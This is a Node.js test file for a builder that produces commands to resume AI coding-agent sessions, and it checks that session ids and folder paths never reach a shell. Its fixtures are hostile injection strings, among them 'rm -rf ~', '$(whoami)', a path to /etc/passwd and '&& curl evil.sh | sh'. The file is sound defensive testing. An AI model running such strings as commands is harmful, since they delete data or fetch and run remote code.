'use strict';

/**
 * Tests for the resume command builder.
 *
 * The security case is the point of this file. Session ids and folder paths are
 * read out of other programs' files: a directory can legitimately be called
 * `; rm -rf ~`, and nothing stops an agent writing whatever it likes as a
 * session id. Building a command line by concatenation would hand those to a
 * shell. Everything here returns an argument vector, so the assertions below
 * check that no metacharacter ever reaches a position where it could act.
 */

const test = require('node:test');
const assert = require('node:assert/strict');

const { resumeCommand, canResume, bareId, quoteForDisplay } = require('../src/core/resume');

const ID = '64ffbe9a-04de-430a-91ab-f18ff7fc5c92';
const FOLDER = '/home/zam/repos/claudechatbrowser';

test.describe('the command each CLI actually accepts', () => {
  // Verified against each tool's own --help.
  const expected = {
    claude: ['claude', ['--resume', ID]],
    codex: ['codex', ['resume', ID]],
    'copilot-cli': ['copilot', [`--resume=${ID}`]],
    qwen: ['qwen', ['--resume', ID]],
  };

  for (const [agent, [command, args]] of Object.entries(expected)) {
    test(agent, () => {
      const r = resumeCommand(agent, `${agent}:${ID}`, FOLDER);
      assert.equal(r.ok, true);
      assert.equal(r.command, command);
      assert.deepEqual(r.args, args);
      assert.equal(r.cwd, FOLDER);
      assert.equal(r.exact, true, 'reopens the very session being read');
    });
  }

  test('the agent prefix is ours and is not passed to the CLI', () => {
    const r = resumeCommand('claude', `claude:${ID}`, FOLDER);
    assert.ok(r.args.every((a) => !a.includes('claude:')), r.args.join(' '));
    assert.equal(bareId(`claude:${ID}`), ID);
    assert.equal(bareId(ID), ID, 'a bare id passes through unchanged');
  });
});

test.describe('agents that cannot reopen the session being read', () => {
  // Gemini resumes by index or "latest", never by id. A button that silently
  // opened a different conversation would be worse than no button.
  test('gemini says so rather than opening the wrong one', () => {
    const r = resumeCommand('gemini', `gemini:${ID}`, FOLDER);
    assert.equal(r.ok, true);
    assert.equal(r.exact, false);
    assert.equal(r.note, 'latest-only', 'a code, said in the reader’s language by the renderer');
    assert.deepEqual(r.args, ['--resume', 'latest']);
  });

  test('vscode is refused outright', () => {
    const r = resumeCommand('vscode', `vscode:${ID}`, FOLDER);
    assert.equal(r.ok, false);
    assert.equal(r.reason, 'unsupported');
    assert.ok(r.note);
  });

  test('canResume answers for the button', () => {
    assert.equal(canResume('claude'), true);
    assert.equal(canResume('codex'), true);
    assert.equal(canResume('gemini'), false);
    assert.equal(canResume('vscode'), false);
    assert.equal(canResume('inconnu'), false);
  });

  test('an unknown agent is refused', () => {
    assert.equal(resumeCommand('brand-new', ID, FOLDER).reason, 'unknown-agent');
  });
});

test.describe('nothing hostile reaches a command line', () => {
  const hostile = [
    '; rm -rf ~',
    '$(whoami)',
    '`id`',
    'a b',
    '../../etc/passwd',
    'x\ny',
    "'; touch /tmp/pwned; '",
    '&& curl evil.sh | sh',
  ];

  test('a session id that is not plainly an id is refused', () => {
    for (const id of hostile) {
      const r = resumeCommand('claude', id, FOLDER);
      assert.equal(r.ok, false, JSON.stringify(id));
      assert.equal(r.reason, 'unsafe-session-id', JSON.stringify(id));
    }
  });

  test('an empty or relative folder is refused', () => {
    for (const folder of ['', '   ', 'relatif/chemin', null, undefined]) {
      assert.equal(resumeCommand('claude', ID, folder).ok, false, JSON.stringify(folder));
    }
  });

  // A folder path is NOT ours to validate beyond being absolute: a directory may
  // legitimately contain spaces, quotes and semicolons. It is safe because it is
  // passed as `cwd`, never as a command-line word.
  test('an awkward folder name is carried verbatim, not escaped into a command', () => {
    const awkward = "/home/zam/mon projet; rm -rf ~/'quote'";
    const r = resumeCommand('claude', ID, awkward);
    assert.equal(r.ok, true);
    assert.equal(r.cwd, awkward, 'passed as the working directory, untouched');
    assert.ok(r.args.every((a) => !a.includes('rm -rf')), 'never reaches the argument vector');
  });

  test('the result is an argument vector, never a string to be interpreted', () => {
    const r = resumeCommand('codex', ID, FOLDER);
    assert.ok(Array.isArray(r.args));
    assert.ok(r.args.every((a) => typeof a === 'string'));
  });
});

test.describe('the text shown to the reader', () => {
  test('is quoted so it can be pasted safely', () => {
    assert.equal(quoteForDisplay('simple'), 'simple');
    assert.equal(quoteForDisplay('--resume=abc'), '--resume=abc');
    assert.equal(quoteForDisplay('deux mots'), "'deux mots'");
    assert.equal(quoteForDisplay("il n'y a"), "'il n'\\''y a'");
  });

  test('reads as the command a person would type', () => {
    assert.equal(resumeCommand('claude', ID, FOLDER).display, `claude --resume ${ID}`);
    assert.equal(resumeCommand('codex', ID, FOLDER).display, `codex resume ${ID}`);
  });
});
